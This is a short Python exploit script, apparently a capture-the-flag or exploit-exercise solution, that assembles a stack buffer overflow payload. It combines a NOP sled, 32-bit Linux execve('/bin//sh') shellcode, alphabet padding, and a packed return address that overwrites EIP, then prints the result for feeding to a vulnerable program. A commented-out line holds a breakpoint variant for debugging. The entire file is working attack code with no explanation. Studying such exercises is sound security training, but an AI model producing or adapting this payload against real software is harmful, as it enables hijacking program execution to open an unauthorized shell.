import struct


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJJKKKKKMMMMNNNNLLLLOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

eip = struct.pack("I", 0x0804854b)

nopslope = struct.pack("I", 0xbffff6a0)

#print ("\x90"*50)+("\xCC"*28)+("\x90"*2)+eip+nopslope

print ("\x90"*40)+shellcode+("\x90"*12)+eip+nopslope
